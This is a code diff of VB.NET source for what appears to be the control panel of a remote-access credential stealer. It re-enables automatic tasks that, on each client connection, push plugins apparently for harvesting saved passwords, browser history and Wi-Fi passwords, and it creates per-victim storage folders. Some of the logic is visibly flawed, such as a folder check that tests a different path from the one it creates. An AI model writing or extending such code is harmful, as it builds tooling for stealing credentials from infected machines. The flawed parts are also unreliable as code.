@@ -1,4 +1,5 @@
 ﻿Imports System.ComponentModel
+Imports System.IO
 Imports System.Net
 Imports System.Net.Sockets
 Imports System.Runtime.Serialization.Formatters.Binary
@@ -24,7 +25,7 @@ Public Class Dark
 
     Public Sub Automation_Tasks(ByVal C As Clients)
 
-        Thread.Sleep(100)
+
 
         If Settings.Pass_CHK.Checked = True Then
 
@@ -34,9 +35,11 @@ Public Class Dark
 
             P.Plugin = Plugins._PW
 
-            C.Sender(P)
+            C.Main_Form.Loading_PW.Visible = True
 
-            Thread.Sleep(100)
+            C.Main_Form.Loading_PW.Active = True
+
+            C.Sender(P)
 
         End If
 
@@ -48,9 +51,11 @@ Public Class Dark
 
             P2.Plugin = Plugins._WB
 
-            C.Sender(P2)
+            C.Main_Form.Loading_Hist.Visible = True
 
-            Thread.Sleep(100)
+            C.Main_Form.Loading_Hist.Active = True
+
+            C.Sender(P2)
 
         End If
 
@@ -61,6 +66,10 @@ Public Class Dark
             P2.Type_Packet = PacketType.PLUGIN
 
             P2.Plugin = Plugins._W_PW
+
+            C.Main_Form.Loading_W_PW.Visible = True
+
+            C.Main_Form.Loading_W_PW.Active = True
 
             C.Sender(P2)
 
@@ -126,6 +135,15 @@ Public Class Dark
 
                 Client.Connected = True
 
+                Dim today = Date.Today
+                Dim day = today.Day
+                Dim month = today.Month
+
+                If Not Directory.Exists("Users/" & Client.ID.Replace(":", "_")) Then
+                    IO.Directory.CreateDirectory("Users/" & Client.ID.Replace(":", "_") & day & month)
+                End If
+
+
                 L.Add(Client)
 
                 Dim B As BinaryFormatter = New BinaryFormatter()
@@ -149,7 +167,7 @@ Public Class Dark
                 Client.Sender(p)
 
 
-                'Task.Run(Sub() Automation_Tasks(Client))
+                Task.Run(Sub() Automation_Tasks(Client))
 
             End While
 
@@ -230,6 +248,8 @@ Public Class Dark
     End Sub
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
 
+        Helpers.Flags()
+
         If IO.File.Exists("Settings.ini") Then
 
             Dim P As String() = Split(IO.File.ReadAllText("Settings.ini"), ",")
@@ -254,6 +274,11 @@ Public Class Dark
 
         End If
 
+        If Not Directory.Exists("Users") Then
+            IO.Directory.CreateDirectory("Users")
+        Else
+            IO.Directory.CreateDirectory("Users")
+        End If
         AddHandler Settings_Pic.MouseDown, Sub() ChangeColor_MouseDown_Pic(Settings_Pic)
         AddHandler Settings_Pic.MouseUp, Sub() ChangeColor_MouseUp_Pic(Settings_Pic)
         AddHandler Settings_Pic.MouseHover, Sub() ChangeColor_MouseHover_Pic(Settings_Pic)
